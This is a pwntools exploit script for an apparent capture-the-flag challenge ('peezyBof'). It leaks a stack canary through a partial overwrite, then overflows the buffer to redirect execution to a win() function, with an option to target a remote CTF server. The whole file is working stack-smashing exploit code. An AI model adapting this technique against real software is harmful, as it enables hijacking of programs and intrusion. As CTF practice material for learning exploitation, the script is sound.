#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './peezyBof'
elf = ELF(binary)

# Addresses
win_addr = 0x401236

def exploit(target):
    # Parse INFO section
    info = target.recvuntil(b'=== === === === === === ===\n').decode()
    
    # Extract addresses
    import re
    win_match = re.search(r'\[info\] win\(\) addr\s+: (0x[0-9a-f]+)', info)
    canary_addr_match = re.search(r'\[info\] \?\?\? addr\s+: (0x[0-9a-f]+)', info)
    ret_addr_match = re.search(r'\[info\] RET slot addr\s+: (0x[0-9a-f]+)', info)
    buf_addr_match = re.search(r'\[info\] buf addr\s+: (0x[0-9a-f]+)', info)
    
    if not all([canary_addr_match, ret_addr_match, buf_addr_match]):
        log.error("Failed to parse addresses")
        return
    
    canary_addr = int(canary_addr_match.group(1), 16)
    ret_addr = int(ret_addr_match.group(1), 16)
    buf_addr = int(buf_addr_match.group(1), 16)
    
    offset_to_canary = canary_addr - buf_addr
    offset_to_ret = ret_addr - buf_addr
    
    log.success(f"Buf addr: {hex(buf_addr)}")
    log.success(f"Canary addr: {hex(canary_addr)} (offset: {offset_to_canary})")
    log.success(f"RET addr: {hex(ret_addr)} (offset: {offset_to_ret})")
    
    target.recvuntil(b'What\'s your name : ')
    
    # Stage 1: Leak canary by overwriting LSB with non-null
    # Send exactly offset_to_canary bytes + 1 byte (non-null) to corrupt canary LSB
    payload1 = b'A' * offset_to_canary + b'\xff'  # Overwrite canary LSB with 0xff
    target.send(payload1)
    
    # Receive leaked data
    target.recvuntil(b'Your input : ')
    leaked = target.recvuntil(b'\n')
    log.info(f"Leaked ({len(leaked)} bytes): {leaked[:80]}")
    
    # Extract canary from leaked data
    # Format: AAAA...(offset_to_canary bytes)...\xff<canary_bytes_2-8>\n
    if len(leaked) > offset_to_canary + 1:
        # Canary is after our input
        canary_leaked = leaked[offset_to_canary+1:offset_to_canary+8]  # 7 bytes (LSB already known)
        canary_leaked = canary_leaked.split(b'\n')[0]  # Remove newline if present
        
        # Pad to 7 bytes if needed
        canary_leaked = canary_leaked.ljust(7, b'\x00')
        
        # Reconstruct full canary: LSB is 0x00, rest is leaked
        canary = u64(b'\x00' + canary_leaked)
        log.success(f"Leaked canary: {hex(canary)}")
    else:
        log.error(f"Failed to leak canary, only got {len(leaked)} bytes")
        return
    
    # Stage 2: Overflow with correct canary
    target.recvuntil(b'Is this correct? (Yes/No) > ')
    
    # Build payload: buf(offset_to_canary) + canary(8) + padding + ret_addr
    payload2 = b'A' * offset_to_canary
    payload2 += p64(canary)
    payload2 += b'B' * (offset_to_ret - offset_to_canary - 8)  # Fill to RET
    payload2 += p64(win_addr)
    
    log.info(f"Sending payload2 ({len(payload2)} bytes)")
    target.send(payload2)
    
    # Get flag
    target.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        target = remote('pwn.runa2025.kr', 7002)
    else:
        target = process(binary)
    
    exploit(target)
